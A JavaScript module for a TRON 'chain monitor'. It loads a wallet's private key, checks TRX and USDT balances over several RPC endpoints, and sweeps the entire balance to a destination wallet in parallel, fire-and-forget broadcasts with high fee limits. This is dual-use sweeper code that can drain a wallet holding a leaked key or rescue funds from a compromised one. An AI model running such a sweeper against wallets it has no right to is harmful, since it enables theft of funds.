const TronWeb = require('tronweb');
const AbstractChainMonitor = require('./AbstractChainMonitor');

class TronChainMonitor extends AbstractChainMonitor {
  constructor(config) {
    super('TRON', config);
    
    this.tronWebs = [];
    this.mainTronWeb = null;
    this.rpcEndpoints = config.rpcEndpoints || [
      'https://api.trongrid.io',
      'https://api.tronstack.io'
    ];
    
    this.usdtContract = config.usdtContract || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    this.normalFeeLimit = config.normalFeeLimit || 20000000;
    this.emergencyFeeLimit = config.emergencyFeeLimit || 100000000;
  }

  async setupConnection() {
    this.log('🔗 Testing TRON RPC connections...');
    
    const privateKey = this.config.privateKey;
    
    for (let i = 0; i < this.rpcEndpoints.length; i++) {
      try {
        const tronWeb = new TronWeb({
          fullHost: this.rpcEndpoints[i],
          privateKey: privateKey
        });
        
        await Promise.race([
          tronWeb.trx.getCurrentBlock(),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
        ]);
        
        this.tronWebs.push(tronWeb);
        this.log(`✅ RPC ${i} connected: ${this.rpcEndpoints[i]}`);
        
      } catch (error) {
        this.log(`❌ RPC ${i} failed: ${this.rpcEndpoints[i]}`);
      }
    }
    
    if (this.tronWebs.length === 0) {
      throw new Error('❌ All TRON RPC endpoints failed!');
    }
    
    this.log(`🚀 ${this.tronWebs.length} TRON RPC endpoints ready!\n`);
    
    this.mainTronWeb = this.tronWebs[0];
    const address = this.mainTronWeb.address.fromPrivateKey(privateKey);
    
    this.log(`🔑 Wallet: ${address}`);
    this.log(`📍 Destination: ${this.destinationWallet}\n`);
  }

  sunToTrx(sun) {
    return Number(sun) / 1000000;
  }

  async getUSDTBalance(tronWeb) {
    try {
      const address = tronWeb.defaultAddress.base58;
      
      try {
        const parameter = [{type: 'address', value: address}];
        const transaction = await tronWeb.transactionBuilder.triggerConstantContract(
          this.usdtContract,
          'balanceOf(address)',
          {},
          parameter,
          address
        );
        
        if (transaction && transaction.constant_result && transaction.constant_result[0]) {
          return BigInt('0x' + transaction.constant_result[0]);
        }
      } catch (e) {}
      
      try {
        const contract = await tronWeb.contract().at(this.usdtContract);
        const balance = await contract.balanceOf(address).call();
        return BigInt(balance.toString());
      } catch (e) {}
      
      return 0n;
      
    } catch (error) {
      return 0n;
    }
  }

  async getBalances() {
    for (let i = 0; i < this.tronWebs.length; i++) {
      try {
        const tronWeb = this.tronWebs[i];
        const address = tronWeb.defaultAddress.base58;
        
        const trxBalance = BigInt(await tronWeb.trx.getBalance(address));
        const usdtBalance = await this.getUSDTBalance(tronWeb);
        
        return { native: trxBalance, usdt: usdtBalance, rpcIndex: i };
        
      } catch (error) {
        continue;
      }
    }
    
    throw new Error('All TRON RPCs failed');
  }

  async checkMultisig() {
    try {
      const address = this.mainTronWeb.defaultAddress.base58;
      const account = await this.mainTronWeb.trx.getAccount(address);
      
      if (account.active_permission && account.active_permission.length > 0) {
        const activePermission = account.active_permission[0];
        if (activePermission.keys && activePermission.keys.length > 1) {
          return true;
        }
      }
      return false;
    } catch (error) {
      return false;
    }
  }

  async executeTransfer(trxBalance, usdtAmount) {
    this.log(`\n🚀🚀 PARALLEL TRANSFER ACTIVATED! 🚀🚀`);
    this.log(`🔥 FIRE-AND-FORGET mode - NO waiting for confirmation!`);
    this.log(`💰 USDT: ${Number(usdtAmount) / 1000000} | TRX: ${this.sunToTrx(trxBalance)}`);
    
    const allPromises = [];
    let usdtAttempted = false;
    let trxAttempted = false;
    const txHashes = [];
    
    if (usdtAmount > 0n) {
      usdtAttempted = true;
      for (let i = 0; i < this.tronWebs.length; i++) {
        allPromises.push(
          (async (index) => {
            try {
              const tronWeb = this.tronWebs[index];
              const address = tronWeb.defaultAddress.base58;
              
              const functionSelector = 'transfer(address,uint256)';
              const parameter = [
                {type: 'address', value: this.destinationWallet},
                {type: 'uint256', value: usdtAmount.toString()}
              ];
              
              const tx = await tronWeb.transactionBuilder.triggerSmartContract(
                this.usdtContract,
                functionSelector,
                {
                  feeLimit: this.emergencyFeeLimit,
                  callValue: 0
                },
                parameter,
                address
              );
              
              if (!tx || !tx.transaction) {
                return { success: false, type: 'USDT', index };
              }
              
              const signed = await tronWeb.trx.sign(tx.transaction);
              
              tronWeb.trx.sendRawTransaction(signed, { shouldPollResponse: false }).then(result => {
                if (result && result.result) {
                  const txid = result.txid || result.transaction?.txID;
                  if (txid) {
                    txHashes.push({ type: 'USDT', txid });
                  }
                  this.log(`✅ USDT TX (RPC ${index}): ${txid || 'broadcasted'}`);
                }
              }).catch(() => {});
              
              return { success: true, type: 'USDT', index };
              
            } catch (error) {
              this.log(`❌ USDT RPC ${index}: ${error.message}`);
              return { success: false, type: 'USDT', index };
            }
          })(i)
        );
      }
    }
    
    const feeReserve = 1000000n;
    if (trxBalance > feeReserve) {
      trxAttempted = true;
      const amountToSend = trxBalance - feeReserve;
      
      for (let i = 0; i < this.tronWebs.length; i++) {
        allPromises.push(
          (async (index) => {
            try {
              const tronWeb = this.tronWebs[index];
              
              const tx = await tronWeb.transactionBuilder.sendTrx(
                this.destinationWallet,
                Number(amountToSend)
              );
              
              const signed = await tronWeb.trx.sign(tx);
              
              tronWeb.trx.sendRawTransaction(signed, { shouldPollResponse: false }).then(result => {
                if (result && result.result) {
                  const txid = result.txid || result.transaction?.txID;
                  if (txid) {
                    txHashes.push({ type: 'TRX', txid });
                  }
                  this.log(`✅ TRX TX (RPC ${index}): ${txid || 'broadcasted'}`);
                }
              }).catch(() => {});
              
              return { success: true, type: 'TRX', index };
              
            } catch (error) {
              this.log(`❌ TRX RPC ${index}: ${error.message}`);
              return { success: false, type: 'TRX', index };
            }
          })(i)
        );
      }
    }
    
    if (allPromises.length === 0) {
      return { success: false, txHashes: [] };
    }
    
    this.log(`🚀 Launching ${allPromises.length} fire-and-forget transfers...`);
    const results = await Promise.allSettled(allPromises);
    
    const successful = results.filter(r => r.status === 'fulfilled' && r.value.success);
    const usdtSuccess = successful.filter(r => r.value.type === 'USDT');
    const trxSuccess = successful.filter(r => r.value.type === 'TRX');
    
    this.log(`\n📊 BROADCAST RESULTS:`);
    if (usdtAttempted) this.log(`   💵 USDT: ${usdtSuccess.length}/${this.tronWebs.length} broadcasted`);
    if (trxAttempted) this.log(`   💰 TRX: ${trxSuccess.length}/${this.tronWebs.length} broadcasted`);
    
    const hasUsdtSuccess = !usdtAttempted || usdtSuccess.length > 0;
    const hasTrxSuccess = !trxAttempted || trxSuccess.length > 0;
    
    if (hasUsdtSuccess && hasTrxSuccess) {
      this.log(`🎯 ASSETS BROADCASTED - Transfers in mempool!\n`);
      
      txHashes.forEach(tx => this.broadcastedTxHashes.add(tx.txid));
      
      return { success: true, txHashes };
    } else {
      this.log(`⚠️ Some broadcasts failed - will retry!\n`);
      return { success: false, txHashes: [] };
    }
  }

  formatNativeBalance(balance) {
    return `${this.sunToTrx(balance).toFixed(6)} TRX`;
  }

  getMinimumNativeBalance() {
    return 1000000n;
  }

  getExplorerUrl(txHash) {
    return `https://tronscan.org/#/transaction/${txHash}`;
  }
}

module.exports = TronChainMonitor;
